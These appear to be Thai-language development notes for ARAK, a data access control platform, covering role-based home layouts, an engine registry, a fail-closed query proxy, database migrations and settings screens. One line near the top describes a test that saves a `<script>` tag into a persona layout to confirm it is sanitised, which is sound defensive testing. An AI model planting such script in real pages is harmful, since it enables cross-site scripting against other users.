- `DacApplication` สร้าง `HomeLayoutStore` **ก้อนเดียว** แล้วส่งให้ทั้ง `HomeResource` และ `HomePersonaResource` → validator ตัวเดียวกัน ไม่มีทางเข้าที่สอง
- มีเทสต์ยืนยันตรงๆ: `aPersonaIsCleanedLikeAnyOtherLayout` — เซฟ `<script>` ลง persona แล้วอ่านกลับ**ในฐานะคนอื่น**

### AS.3 ของที่เพิ่ม

| ชั้น | ของ |
|---|---|
| Migration | **`V19__home_role_layout.sql`** — PK เป็น `app_role` (CHECK 5 ค่าเดียวกับ `app_role_assignment`) · ไม่มีแถว = built-in |
| Model | `HomeLayout.Persona` (enum เรียงตาม precedence + `heldBy(Set<String>)` คืน**ทั้งหมด**ที่ถือ เรียงแรงสุดก่อน) · `LayoutSource {PERSONAL, ROLE, BUILT_IN}` · `LayoutView` กว้างขึ้นจาก 4 → 6 field พร้อม factory 3 ตัว · `PersonaLayout` |
| Store | `forPrincipal(id, governanceReader, personas)` · `inheritedFor(...)` (แยกออกมาเพราะ `reset` ต้องตอบคำถามเดียวกัน) · `builtInFor(persona)` · `personas()` · `savePersona(...)` · `resetPersona(...)` |
| API | `GET/PUT/DELETE /v1/home/personas[/{role}]` — `HomePersonaResource`, admin-only, role ผิด = **404 ไม่ใช่ 400** (คนขอมาด้วย address ของหน้าที่ไม่มีอยู่) |
| Frontend | `api/home.ts` (+`source`, `sourceRole`, `HomePersonaLayout`, 3 ฟังก์ชัน) · **`settings/HomePersonasPage.tsx`** (ใช้ `HomeEditor` ตัวเดิมซ้ำ) · การ์ดใน Settings · route `/settings/home` |

### AS.4 `reset` เปลี่ยนความหมาย — และเปลี่ยนถูกแล้ว

เดิม: กด Reset → ได้หน้า built-in
ตอนนี้: กด Reset → ได้**หน้าที่ตัวเองจะได้ถ้าไม่เคยแตะเลย** ซึ่งคือ persona ของ role ถ้ามี

ถ้าไม่แก้ตรงนี้ คนที่กด Reset หลัง admin จัดหน้า auditor ไว้ จะเด้งไปหน้าที่ product ship มาเมื่อปีที่แล้ว แทนที่จะเป็นหน้าที่ทีมเขาใช้กันอยู่ — เทสต์ `resetLandsOnTheRolePageWhenThereIsOne`

### AS.5 `HomeEditor` ถูกใช้ซ้ำ — แต่**ประโยคเดียวที่ห้ามใช้ซ้ำ**

`HomeEditor` เดิมเขียนหัวข้อไว้ว่า *"Only yours. Nothing here changes what anyone else sees"*
ใน persona editor ประโยคนี้ **เป็นเท็จ** → เพิ่ม prop `heading` / `subheading` / `resetLabel` (มี default เท่าเดิมทุกตัว หน้าจอเดิมไม่ขยับสักพิกเซล) แล้ว persona editor ส่งประโยคของตัวเองเข้าไป:

> *"Everyone with this role who has not arranged their own page will see this. Anyone who has arranged theirs keeps it."*

และหน้า Home ของแต่ละคนก็บอกที่มาของหน้าที่กำลังจะแก้ด้วย (เฉพาะตอนกด Edit — หน้าอ่านปกติไม่เปลี่ยน):

> *"You are starting from the page your administrator arranged for the auditor role. Saving makes it yours, and later changes to that page will no longer reach you."*

> ⚠️ **`HomeResource` Javadoc ที่เขียนว่า "There is deliberately no administrator override" ถูกเขียนใหม่แล้ว** — ประโยคนั้นเป็นจริงตอน M12 และเป็นเท็จตอน M12b ถ้าปล่อยไว้คือ comment ที่โกหกคนอ่านคนถัดไป

## รอบก่อนหน้า — **M18 slice 1: ชื่อ engine หายไปจากโค้ดทั้ง 14 จุด** · และ **proxy หยุด query ที่มันบังคับ policy ไม่ได้ แทนที่จะปล่อยผ่าน**

> ผู้ใช้สั่งสลับลำดับให้ M18 ขึ้นก่อนทุกอย่าง (`ปรับมาทำส่วนนี้ก่อนเลย เพื่อสร้างฐานให้แข็งแรง`) และให้เริ่มที่ฝั่ง proxy
> รอบนี้คือ slice 1 ของ M18 — **ปิดครบทั้ง 14 จุดที่ AP.7 นับไว้** บวกของที่เจอระหว่างทางอีกสองอย่าง

### AR.1 registry ตัวเดียวที่ทุกจุดอ่าน — `com.mfec.dac.common.engine`

ของใหม่ 4 ไฟล์ใน `dac-common` (โมดูลที่**ไม่มี** JDBC driver และ**ไม่มี** SQL compiler อยู่บน classpath ซึ่งเป็นข้อจำกัดที่กำหนดรูปร่างของ interface):

| ไฟล์ | หน้าที่ |
|---|---|
| `SourceEngine.java` | interface — `id()` · `displayName()` · `defaultPort()` · `supportsSchemas()` · `driverClassName()` · `jdbcUrl(JdbcCoordinates)` · `dialectId()` · `proxyCapabilities()` · nested `record JdbcCoordinates` ที่ปฏิเสธ host ว่างและ port นอกช่วง 1–65535 ตั้งแต่ constructor · nested `Capability` ที่ถือ `ROW_FILTER` / `COLUMN_MASK` / `CELL_MASK` / `COLUMN_HIDE` |
| `SourceEngines.java` | registry — `all()` · `ids()` · `find()` · `of()` · `UnsupportedEngineException extends IllegalArgumentException` |
| `PostgresEngine.java` | POSTGRES · PostgreSQL · 5432 · `org.postgresql.Driver` · url fallback เป็น database `postgres` · capability ครบ 4 |
| `SqlServerEngine.java` | SQLSERVER · SQL Server · 1433 · `com.microsoft.sqlserver.jdbc.SQLServerDriver` · url ระบุ `encrypt=true;trustServerCertificate=true` ตรงๆ · capability ครบ 4 |

**สองการตัดสินใจที่ควรอ่านก่อนแก้:**

1. **`dialectId()` คืน String ไม่ใช่ `SqlDialect`** — เพราะถ้าคืน object โมดูลที่แค่เปิด socket (`dac-connector-source`) จะต้องลาก SQL compiler มาทั้งก้อน · ราคาของการเลือกแบบนี้คือไม่มีอะไรใน `dac-common` รู้ว่าชื่อ dialect นั้น resolve ได้จริงไหม → หนี้ก้อนนี้จ่ายด้วย `SqlDialectsTest` ที่เดินทุก engine ที่ลงทะเบียนแล้วเรียก `SqlDialects.forEngine()` จริง (อยู่ใน `dac-compiler-sql` ซึ่งเห็นทั้งสองฝั่ง)
2. **`REGISTRY` เป็น static map ไม่ใช่ `ServiceLoader`** — engine ที่ platform นี้บังคับ policy ได้คือ**การตัดสินใจ** ไม่ใช่ผลข้างเคียงของการแพ็ก jar · ServiceLoader แปลว่า jar ที่หล่นเข้า classpath เพิ่ม engine ได้เงียบๆ ซึ่งเป็นสิ่งสุดท้ายที่อยากได้ในระบบควบคุมการเข้าถึงข้อมูล

### AR.2 switch ทั้ง 3 ตัวหายไปแล้ว — และระหว่างทางเจอโค้ดที่ copy ตัวเอง

| ที่เดิม | เปลี่ยนเป็น |
|---|---|
| `JdbcTargets.url()` — `switch (engine)` | `SourceEngines.of(target.engine()).jdbcUrl(coordinates(target))` |
| `SourceProbe.jdbcUrl()` — **switch ชุดเดียวกัน copy มาทั้งดุ้น** | ลบทิ้งทั้ง method → เรียก `JdbcTargets.url(target)` |
| `QueryService.dialectFor()` — `switch` ที่ default เป็น Postgres | `SqlDialects.forEngineId(source.engine().name())` |

🐛 **ของที่เจอ:** `JdbcTargets` มี javadoc เขียนไว้เองว่ามันมีอยู่เพื่อ *"ให้ probe กับ proxy ต่อเหมือนกัน"* — แต่ `SourceProbe` **copy ทั้ง URL builder และ block ที่ตั้ง `Properties` ไปไว้ในตัวเอง** คือคลาสที่เกิดมาเพื่อกันการ duplicate มี duplicate ของตัวเองอยู่ข้างใน · รอบนี้ยุบทั้งสองอย่างเข้า `JdbcTargets` แล้ว (`properties(Credential)` ตัวเดียว) ซึ่งสำคัญกว่าที่เห็น เพราะข้อโต้แย้งเรื่องความปลอดภัยของ FR-6.3.1 คือ *DBA ต้องแยก traffic ของเราออกจากของ user ได้ใน `pg_stat_activity`* — ซึ่งจริงก็ต่อเมื่อ probe / introspector / proxy ประกาศชื่อตัวเองเหมือนกันทุกตัว

⚠️ `dialectFor()` เดิม **default เป็น Postgres dialect** แปลว่า engine ที่ไม่รู้จักจะได้ SQL ของ Postgres ไปยิง — ไม่ใช่แค่ error แต่เป็น error ที่ **อาจสำเร็จ**

### AR.3 🔒 proxy fail-closed แล้ว — `ProxyCapabilities`

ของใหม่: `backend/dac-proxy/src/main/java/com/mfec/dac/proxy/ProxyCapabilities.java`

```java
ProxyCapabilities.require(SourceEngines.of(source.engine().name()), fqn.get(), decision);
```

- `required(decision)` → แปลง decision เป็นเซตของ capability ที่ต้องใช้ (row predicate → `ROW_FILTER` · hidden column → `COLUMN_HIDE` · mask ที่ไม่มีเงื่อนไข → `COLUMN_MASK` · mask ที่มีเงื่อนไข → `CELL_MASK`)
- `missing(engine, decision)` → ตัวที่ engine นั้นทำไม่ได้ **ทั้งหมด** ไม่ใช่ตัวแรก
- `require(...)` → โยน `QueryRewriter.RefusedException` ที่บอก **ชื่อ asset + สิ่งที่ทำไม่ได้ + ให้ไปทำอะไรแทน** (*"Enforce this asset through a secure view instead."*) — refusal ที่ไม่บอกทางออกคือ refusal ที่คนแก้ด้วยการปิด policy

**วางไว้หลัง `recordDecision(...)` โดยตั้งใจ** — query ที่กำลังจะถูกปฏิเสธเพราะ engine ทำไม่ได้ ก็ยังเป็น decision ที่เกิดขึ้นจริง · auditor ที่ถามว่า "ใครพยายามอ่านตารางนี้บ้าง" ต้องได้คำตอบเดียวกันไม่ว่าตารางนั้นอยู่ engine ไหน

⚠️ **ทำไมไม่ใช้ตาราง `engine_capability`** — ตารางนั้นตอบว่า *engine* บังคับอะไรได้เอง (โหมด 5.1.1 / 5.1.2) · แต่โหมด proxy ไม่มีอะไรถูกบังคับโดย engine เลย ARAK เขียน statement ใหม่เอง คำถามจึงเป็น *rewriter ของ build นี้พูดอะไรได้* ซึ่งเป็นข้อเท็จจริงเกี่ยวกับโค้ด ไม่ใช่เกี่ยวกับ database · และสองคำตอบนี้**ต่างกันจริงทั้งสองทาง** — Postgres ไม่มี column masking ใน core เลย แต่ proxy mask column ของมันได้สบาย

### AR.4 `V18__source_engine.sql` — `CHECK` สองอันกลายเป็นตารางที่อ่านได้

```sql
CREATE TABLE source_engine (id, display_name, default_port, supports_schemas);
DELETE FROM engine_capability WHERE mode = 'PROXY';
ALTER TABLE data_source        DROP CONSTRAINT data_source_engine_check;
ALTER TABLE data_source        ADD  CONSTRAINT data_source_engine_fkey        FK → source_engine ON DELETE RESTRICT;
ALTER TABLE engine_capability  DROP CONSTRAINT engine_capability_engine_check;
ALTER TABLE engine_capability  ADD  CONSTRAINT engine_capability_engine_fkey  FK → source_engine ON DELETE CASCADE;
CREATE INDEX data_source_engine_idx ON data_source (engine);
```

- `CHECK (engine IN (...))` **อ่านไม่ได้** — ไม่มีใครถาม database ได้ว่ารองรับ engine อะไรบ้าง นั่นคือเหตุผลที่ frontend ไปพิมพ์ list เอง 6 ที่ · และการขยายมันต้อง rewrite ตาราง production
- **`DROP CONSTRAINT` เขียนแบบไม่มี `IF EXISTS` โดยตั้งใจ** — ถ้าชื่อที่ Postgres generate ไม่ตรง migration ต้องพังเสียงดัง ไม่ใช่ปล่อยให้ CHECK เก่าค้างอยู่คู่กับ FK ใหม่เงียบๆ
- `ON DELETE RESTRICT` ไม่ใช่ `CASCADE` — cascade จะลาก credential reference และ enforcement mode ของทุก table ที่ engine นั้นคุ้มครองอยู่ไปด้วย
- **ลบแถว PROXY ทิ้ง 8 แถว** ตามเหตุผลข้อ AR.3 · แถวของโหมด native ยังอยู่ครบ เพราะพวกนั้นเป็นคำพูดเกี่ยวกับ engine จริงๆ และ M5/M6 compiler ต้องใช้ (FR-6.0b)

🐛 **ของที่เจอ:** `engine_capability` มี **25 แถวที่ seed ไว้ตั้งแต่ V4 และไม่มีโค้ด Java อ่านมันเลยสักบรรทัด** — capability matrix ที่ FR-6.0b สัญญาไว้ ฝั่ง backend ยังไม่ได้ต่อ (ฝั่ง frontend มี `enforcement.ts` ที่คำนวณเองอยู่) รอบนี้แก้ไปครึ่งหนึ่ง: แถว PROXY ย้ายเข้าโค้ดแล้วและมีคนอ่านจริง · แถว native ยังรออยู่ที่ M6

### AR.5 `GET /v1/sources/engines` — และ 6 ไฟล์ frontend เลิกพิมพ์ list เอง

endpoint ใหม่ใน `SourceResource` (วางไว้**ก่อน** `@Path("/{id}")` — JAX-RS เลือก literal path ก่อน template อยู่แล้ว แต่เรียงตามลำดับที่อ่านง่ายไว้ด้วย) ตอบ `id` · `displayName` · `defaultPort` · `supportsSchemas` · `proxyCapabilities`
ไม่มี Source row ในคำตอบ → กติกา `redact()` ไม่เกี่ยว

ฝั่ง frontend:

| ไฟล์ | เดิม | ใหม่ |
|---|---|---|
| `src/engines.ts` ⭐ **ใหม่** | — | `useSourceEngines()` (TanStack Query · `staleTime: Infinity` — list เปลี่ยนตอน deploy ไม่ใช่ตอนคนกรอกฟอร์ม) · `engineLabel()` · `enginePort()` · `engineOptions()` |
| `api/sources.ts` | `type SourceEngine = 'POSTGRES' \| 'SQLSERVER'` | `= string` + `SourceEngineInfo` + `fetchEngines()` |
| `SourcesPage.tsx` | `DEFAULT_PORT` table · dropdown 2 ตัวเลือก · badge ternary | อ่านจาก registry ทั้งสามจุด · `BLANK.engine = ''` แล้วเติมด้วยตัวแรกที่ server ส่งมา |
| `pages/home/widgets.tsx` | badge ternary | `engineLabel(engines, source.engine)` |
| `PolicyBuilderPage.tsx` | dropdown 2 ตัวเลือก · `useState<Engine>('POSTGRES')` | `engineOptions(engines)` · `useState<Engine \| null>(null)` แล้วเติมเมื่อ list มาถึง |
| `pages/policies/enforcement.ts` | `Engine = 'POSTGRES' \| 'SQLSERVER'` | `= string` |

🐛 **ของที่เจอระหว่างทาง (คลาสเดียวกับ `dialectFor()` เป๊ะ):** `enforcement.ts` เขียน note ของ NATIVE_CONFIG ว่า

```ts
engine === 'POSTGRES' ? '<ข้อความ Postgres>' : '<ข้อความ SQL Server>'
```

แปลว่า engine ตัวที่สาม**จะได้ประโยคของ SQL Server ไป** — เป็นคำกล่าวอ้างที่เจาะจง มั่นใจ และผิด เกี่ยวกับผลิตภัณฑ์ที่ไม่มีใครเคยตรวจ · รอบนี้เปลี่ยนเป็น `Record<string, string>` + fallback ที่พูดความจริงว่า *"Native column masking on this engine has not been verified"* และรายงานเป็น **gap** ไม่ใช่ปล่อยผ่าน — เพราะ engine ที่เราไม่มีข้อมูลคือ engine ที่เรามั่นใจน้อยที่สุด · ตารางไม่กี่ตัวจะเงียบไม่ได้

**ที่เหลือคำว่า `SQLSERVER` ใน `frontend/app/src` มีแค่ 2 จุด และทั้งคู่ถูกต้อง** — key ของตาราง note (เป็น prose เกี่ยวกับผลิตภัณฑ์นั้นจริงๆ) และ test ที่ assert พฤติกรรมของทั้งสอง engine ที่ ship จริง

### AR.6 เทสต์ที่เพิ่ม — 606 → 662 (backend) · 161 → 162 (frontend)

| ไฟล์ | จำนวน | สิ่งที่มันกัน |
|---|---|---|
| `SourceEngineConformanceTest` (dac-common) | parameterized ทุก engine | id เป็นตัวใหญ่ไม่ว่าง · หาเจอไม่ว่าสะกดยังไง · port อยู่ในช่วง · url มี host/port/database และขึ้นต้น `jdbc:` · **url ที่ database เป็น null ต้องไม่มีคำว่า "null" อยู่ในนั้น** · `JdbcCoordinates` ปฏิเสธ host ว่าง / port 0 / port 70000 |
| `SqlDialectsTest` (dac-compiler-sql) | 7 | ทุก engine ที่ลงทะเบียนมี dialect จริง · **`of("POSTGRES")` ต้องคืนคนละ instance ทุกครั้ง** (dialect ถือ salt ต่อ column ของ HASH — แชร์ instance = hash ของสอง source correlate กันได้ ซึ่งเป็นสิ่งเดียวที่ salt ต่อ column มีไว้กัน) |
| `ProxyCapabilitiesTest` (dac-proxy) | 11 | **การปฏิเสธ** เป็นหลัก — engine ที่ mask ไม่ได้แล้วรัน query ต่อจะคืน column แบบ plaintext และ**ไม่มีใครแจ้งเป็นบั๊กเพราะ query สำเร็จ** · บวก parameterized ว่า engine ที่ ship จริงทั้งคู่พูดได้ครบทุกอย่างที่ rewriter ปล่อยออกมา |
| `JdbcTargetsTest` (dac-connector-source) | 8 | **`Class.forName(driverClassName())` จริง** — driver ที่มีชื่ออยู่ใน constant แต่ไม่มีใน pom จะ register ได้สวยงามแล้วพังตอนต่อครั้งแรก · โมดูลนี้เป็นที่เดียวที่มี driver ทั้งสองบน classpath |
| `SourceEngineRegistryIT` (dac-service, Testcontainers) | 5 | ตาราง `source_engine` กับ registry ในโค้ดพูดตรงกัน · FK ยังปฏิเสธ engine ที่พิมพ์ผิดเหมือนที่ CHECK เคยทำ · ลบ engine ที่ยังมีคนใช้ไม่ได้ · `engine_capability` เหลือ PROXY 0 แถวและ native > 0 |
| `policyLanguage.test.ts` (frontend) | +1 | engine ที่ไม่มี note ต้องรายงานว่า *ยังไม่ได้ตรวจสอบ* และ **ต้องไม่มีคำว่า "SQL Server" อยู่ในคำตอบ** |

### AR.7 การรันจริง — **V18 ถูกรันบน Postgres จริงครั้งแรก และชื่อ constraint ที่เดาไว้ถูก**

`./mvnw -o -am -pl backend/dac-service verify -Pintegration` → **BUILD SUCCESS 03:53 น.** (2026-09-24 16:00)
· unit **662** (dac-common 31 · dac-engine 277 · dac-compiler-sql 34 · dac-connector-openmetadata 91 · dac-connector-source 19 · dac-proxy 30 · dac-service 180)
· integration **160** · `Failures 0 Errors 0 Skipped 0` ทุกโมดูล · ไม่มีบรรทัด `[ERROR]` เลยทั้ง log

**บรรทัดที่ต้องเห็นถึงจะพูดได้ว่าผ่าน** (ตามกับดักที่จดไว้ใน What Didn't Work):

```
[INFO] Tests run: 5, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 4.119 s
       -- in com.mfec.dac.source.SourceEngineRegistryIT
```

**สิ่งที่การรันนี้พิสูจน์ ซึ่งก่อนหน้านี้เป็นแค่การอนุมานจากการอ่าน migration เก่า:**

| สมมติฐาน | พิสูจน์ด้วย |
|---|---|
| `ALTER TABLE data_source DROP CONSTRAINT data_source_engine_check` มีตัวตนจริง | Flyway รัน V18 ผ่าน — ถ้าชื่อผิด migration ตายทั้งชุดและ IT ทุกตัวใน `dac-service` จะล้มตาม ไม่ใช่แค่ตัวเดียว |
| `engine_capability_engine_check` เช่นกัน | เหมือนกัน |
| FK ยังกันของที่ CHECK เคยกัน | `theForeignKeyGuardsWhatTheCheckUsedTo` — `INSERT ... engine = 'POSTGRESQL'` ได้ error ที่มีคำว่า `data_source_engine_fkey` |
| `ON DELETE RESTRICT` ไม่ใช่ CASCADE | `deletingAnEngineInUseIsRefused` |
| `DELETE FROM engine_capability WHERE mode = 'PROXY'` ลบครบและไม่ลบเกิน | `theCapabilityTableNoLongerSpeaksForTheProxy` — PROXY = 0 แถว · native > 0 แถว |
| ตารางกับ registry ในโค้ดพูดตรงกัน | `theTableAndTheRegistryAgree` + `theRowMatchesTheEngine` |

> ⚠️ **ทำไมถึงจดข้อนี้แยก:** ชื่อ constraint ที่ PostgreSQL ตั้งให้อัตโนมัติ (`<table>_<column>_check`) เป็นสิ่งที่ **เดาถูกได้ 99% แต่ `DROP CONSTRAINT` ที่ไม่มี `IF EXISTS` จะตายทันทีถ้าเดาผิด** — และมันจะตายบน production ตอน deploy ไม่ใช่ตอน compile เจตนาที่ไม่ใส่ `IF EXISTS` คือ *ถ้า CHECK ไม่อยู่ตรงนั้นแปลว่าเราเข้าใจ schema ผิด อย่าเงียบ* → การรัน IT จึงเป็นเงื่อนไขของการ commit ไม่ใช่ของแถม

---

## รอบก่อนหน้า — **ของที่เคยต้อง redeploy ย้ายมาอยู่บนหน้าจอครบ 3 อย่าง** · **ผู้ช่วย LLM มีประตูเข้าแล้ว** · และ **เอกสารกติกาการชนกันของ policy ที่ผู้ใช้ขอ**

> รอบนี้ยาวและกระจายหลายเรื่อง เพราะผู้ใช้ถามแทรกเป็นระยะ สรุปเป็นข้อๆ ตามลำดับที่ทำ

### AQ.1 เอกสารกติกาการชนกันของ policy — และ **spec เดิมเขียนผิดอยู่สองที่**

ผู้ใช้ถามสามข้อ (อยู่หลาย group / 1 group หลาย data policy / หลาย group หลาย policy จะเอาอันล่าสุดหรือกำหนดลำดับ) แล้วขอให้ **สรุปเป็นตารางไว้อธิบายทีม และใส่ไว้ในเอกสาร**

**คำตอบยืนยันจากโค้ดจริง ไม่ใช่จากความจำ:**

| กติกา | บรรทัดที่เป็นหลักฐาน |
|---|---|
| **ชั้นเดียวกัน = union** (ALLOW ใบเดียวที่ match ก็พอ) | `PolicyEngine.java:443` ใน `hasMatchedAllowAt()` — `if (c.layer() == layer && c.allows() && c.applies()) return true;` |
| **ข้ามชั้น = intersection** และ **ชั้นที่ไม่มี ALLOW เลยไม่นับเป็นด่าน** | `PolicyEngine.java:346-348` — ถ้านับ จะกลายเป็นว่าไม่เขียน policy ระดับ SERVICE แล้วทั้ง estate เข้าไม่ได้ |
| **row filter ทบกัน แล้ว AND** | `DecisionSql.java:155` — `return String.join(" AND ", parts);` (ทั้ง `ViewCompiler` และ `QueryRewriter` เดินผ่านตัวนี้ ซึ่งคือเหตุผลที่ FR-6.0c ทดสอบได้) |
| **mask เข้มสุดชนะ เสมอกันคงของเดิม** | `MaskStrength.java:56` — `return rank(candidate) > rank(incumbent) ? candidate : incumbent;` → **ผลลัพธ์ไม่ขึ้นกับลำดับการ evaluate** |
| **ไม่มี "เอาอันล่าสุด" และไม่มีเลขลำดับอยู่ในโมเดลเลย** | ค้นทั้ง repo แล้วไม่มี |

**ของใหม่: [docs/policy-conflict-resolution.md](docs/policy-conflict-resolution.md)** — ภาษาไทย เขียนให้ **คนเขียน policy ที่ไม่ได้อ่านโค้ด** มีสรุป 5 บรรทัด · ตาราง conflict 12 แถว · ตารางลำดับความเข้มของ mask · ตัวอย่างเต็ม 6 เคส (รวมเคสที่คนพลาดบ่อยที่สุด — เขียน policy ระดับ TABLE เพื่อปลด mask ของ ORG แล้วไม่ติด) · และหัวข้อ "ทำไมไม่ใช้เอาอันล่าสุดหรือตั้งเลขลำดับ"

🐛 **ระหว่างเขียนเจอว่า `docs/policy-spec.md` ผิดอยู่สองที่** (ไม่ใช่บั๊ก runtime แต่ใครอ่านแล้วเชื่อจะเขียน policy ผิด):
1. ตารางลำดับความเข้มของ mask **หล่น `CONDITIONAL` หายไปทั้งตัว** — เขียนแค่ `NULLIFY > CONSTANT > HASH > REGEX_REPLACE > PARTIAL > ROUNDING > plaintext` ทั้งที่ `CONDITIONAL` มี rank 1 อยู่จริง แก้เป็นเขียนเลข rank กำกับครบและบอกว่าเสมอกันคงของเดิม
2. **ไม่เคยเขียนเรื่อง union ภายในชั้นเดียวกันไว้เลย** — ข้อความเดิมอ่านแล้วเข้าใจได้ว่า ALLOW ทุกใบต้องผ่าน ซึ่งตรงข้ามกับที่ engine ทำ

⚠️ **กับดักที่บันทึกไว้ให้เห็น: `CONDITIONAL` rank 1 อยู่ต่ำกว่า mask ธรรมดาทุกตัว** → `ROUNDING` ธรรมดาบน column เดียวกันชนะ cell mask **และเงื่อนไขหายไปทั้งก้อน** กลายเป็น mask แบบไม่มีเงื่อนไข — เขียนเตือนไว้ทั้งในเอกสารไทยและข้างตาราง masking function ใน spec แล้ว และใส่ไว้ใน Next Steps ว่าควรพิจารณาจัด rank ใหม่

### AQ.2 M18 — ตอบคำถาม "ออกแบบให้ต่อได้หลาย database type แล้วหรือยัง"

คำตอบตรงๆ คือ **คำนึงถึงแล้วครึ่งเดียว** — ครึ่งที่แพง (Policy IR / `SqlDialect` / `engine_capability`) ถูกแล้ว ครึ่งที่ถูกกลับกระจายอยู่ **14 จุด** และ 3 ใน 14 นั้นเป็น `switch` ที่ **ลืมแล้วไม่ error ตอน compile** แต่พังตอน runtime ด้วยข้อความที่โกหก

รายละเอียดทั้งหมด + งานที่จะทำ (`SourceEngine` registry) อยู่ที่ **ข้อ AP.7** — และลำดับที่ห้ามสลับคือ **M18 ก่อน M6 และก่อนเพิ่ม engine ตัวที่ 3 เสมอ**

### AQ.3 OpenMetadata connection แก้ได้จากหน้าจอแล้ว (V17)

ผู้ใช้เจอว่า **ปุ่ม "Open in OpenMetadata" กดไม่ได้** แล้วพูดว่า *"จริงๆ ต้องใส่ URL ที่ถูกสิ"* ตามด้วย *"ต้องสามารถแก้ Instance หรือ Credential ได้สิ ทำให้เป็นแบบ configurable"*

เดิม base URL กับ token มาจาก environment ล้วน → ย้ายลง DB:

- **`V17__om_connection.sql`** — ตารางแถวเดียว (`id boolean PRIMARY KEY CHECK (id)`) เก็บ `base_url` + `jwt_token_cipher` + `webhook_secret_cipher` + `expected_version` + `fail_on_version_mismatch` + timeout สองตัว · **ความลับสองตัวถูก Fernet ด้วยกุญแจเดียวกับ credential อื่นทั้งระบบ** · `null` แปลว่า *"ใช้ของจาก environment ต่อไป"* → estate ที่ฉีด token มาทาง deployment ยังทำแบบเดิมได้โดยที่ยังย้าย URL จากหน้าจอได้
- **`OmConnectionStore`** — `current()` / `save(Edit, actor, ip)` / `credentials()` · `Edit` ทุก field เป็น optional และ **field ที่เว้นว่างแปลว่าเก็บของเดิมไว้** บังคับด้วย `COALESCE(:token, om_connection.jwt_token_cipher)` ใน `ON CONFLICT DO UPDATE` ไม่ใช่ `excluded.` — ถ้าใช้ `excluded` การย้าย URL จะลบ token ทิ้งโดยไม่มีใครเชื่อมโยงสองเรื่องนี้เข้าด้วยกันได้
- **`requireUrl()`** ปฏิเสธ: ไม่ใช่ http/https · ไม่มี host · มี `?` หรือ `#` (คือ URL ที่ copy จาก address bar) · และ **ลงท้ายด้วย `/api`** ซึ่งเป็นสิ่งที่คนพลาดบ่อยที่สุดเพราะมันคือ URL ที่อยู่ใน history ของ dev — พลาดแล้วจะได้ 404 ทุกครั้งโดยไม่มีอะไรบอกว่า "URL ผิด" · **ยอมให้ private/loopback** ต่างจาก `LlmGatewayUrl` เพราะนี่คือ catalog ของแพลตฟอร์มเองที่ admin เป็นคนตั้ง ไม่ใช่ address ที่ user พิมพ์เข้ามา
- **`OpenMetadataSettingsResource`** — `@Secured("PLATFORM_ADMIN")` ทั้ง class · `PUT` บันทึกแล้ว **`client.reconfigure(...)` ในคอลเดียวกัน** (setting ที่ต้อง restart คือ setting ที่ดูเหมือนพัง) · `POST /test` **รับ candidate** → ทดสอบ address ใหม่ก่อน save ได้ ด้วย `OpenMetadataClient` ตัวใช้แล้วทิ้ง — reconfigure ตัวจริงเพื่อ probe แปลว่าเอา crawler ไปชี้ instance ที่ยังไม่มีใครตกลง และถ้า probe fail มันจะค้างอยู่ตรงนั้น · candidate ที่ไม่ใส่ token ใช้ token เดิม probe
- **หน้าจอ** — section ใหม่ **"Change the connection"** ใน `OpenMetadataSettingsPage.tsx` (เปิดด้วยปุ่ม Edit) · base URL / expected version / timeout 2 ช่อง / toggle fail-on-mismatch / **bot token + webhook secret เป็น `type="password"` ที่เว้นว่าง = คงของเดิม** / ช่องเหตุผล / ปุ่ม **Test before saving** · **Save** · **Discard**
- **หลังบันทึกจะ invalidate `sync-status` / `vocabulary` / `catalog`** เพราะการย้าย catalog เปลี่ยนความหมายของ asset, tag และ term ทุกตัวที่ค้างอยู่บนจอ

⚠️ **กติกาที่ห้ามถอด** — ความลับ **ไม่เคยถูกส่งกลับ browser ในรูปแบบใดเลย** ไม่ใช่ค่า ไม่ใช่ prefix ไม่ใช่ความยาว · `describe()` ตอบแค่ `tokenConfigured` เป็น boolean · ฝั่ง frontend สัญญาว่า **ช่องความลับที่ไม่ได้แตะต้องส่ง `undefined` ไม่ใช่ `''`** เพราะ `''` อ่านได้ว่า "ล้างทิ้ง" — มีเทสต์ยืนยันข้อนี้โดยเฉพาะ (`OpenMetadataSettingsPage.test.tsx`)

### AQ.4 เวลาของ nightly reconcile ตั้งเองได้ (V15)

*"Schedule Sync อยากให้สามารถกำหนดเวลาเองได้ เห็นตอนนี้ Sync ตอน 02:30 Asia/Bangkok"*

- **`V15__sync_schedule.sql`** — `om_sync_schedule` แถวเดียว เก็บ `enabled` + `run_at time` + `zone` · **เก็บเป็นเวลาท้องถิ่นใน zone ไม่ใช่ UTC** เพราะความหมายของ setting คือ "ตีสองครึ่งที่ data centre" ซึ่ง UTC instant จะเลิกแปลว่าอย่างนั้นทันทีที่เจอ daylight saving · `enabled = false` คือค่าจริง ไม่ใช่แถวที่หายไป — estate ที่ crawl จาก pipeline เองต้องการปิด backstop **อย่างตั้งใจ** ซึ่งต้องแยกจาก "ยังไม่มีใคร config"
- **`NightlyReconcile` อ่านใหม่ก่อนจองทุกครั้ง** → save แล้วขยับรอบ**คืนนี้** ไม่ใช่รอบหน้าสัปดาห์
- **`ScheduleEditor`** ในหน้า OM settings — พิมพ์เวลา + zone (datalist จาก `Intl.supportedValuesOf('timeZone')` แต่พิมพ์เองได้ และ server validate เสมอ) · แสดง **สามเวลา** เพราะมันตอบคนละคำถาม: ค่าที่เก็บ / ค่าที่ไฟล์ service ขอไว้ตอนแรก / **รอบที่จองไว้จริง** — schedule เปิดอยู่ในโปรเซสที่ไม่ได้รัน backstop ได้ และทางเดียวที่จะพูดตรงๆ คือพิมพ์การจองออกมา

### AQ.5 เพิ่ม user attribute จากหน้าจอ ARAK ได้ (V16)

*"อยากให้เพิ่ม User Attribute ได้จากหน้าจอของ Arak เลย"* / *"นอกจาก Sync มาแล้ว ยังสามารถเพิ่มได้ที่ Arak"*

- ตัว storage **ไม่ต้องเปลี่ยนเลย** — `principal_attribute.source` แยก `local` / `entra` / `openmetadata` อยู่แล้ว และ sync เขียนเฉพาะแถวของตัวเอง → **ค่าที่พิมพ์เองจะไม่ถูก sync ทับ และไม่ทับของ sync**
- ที่ต้องแก้คือ **audit** — `audit_identity_change` เดิมบรรยาย role grant อย่างเดียว ไม่มีที่เก็บว่า attribute ไหนค่าอะไร → **`V16__local_attributes.sql`** เพิ่ม `attr_key` / `attr_value` และขยาย action list
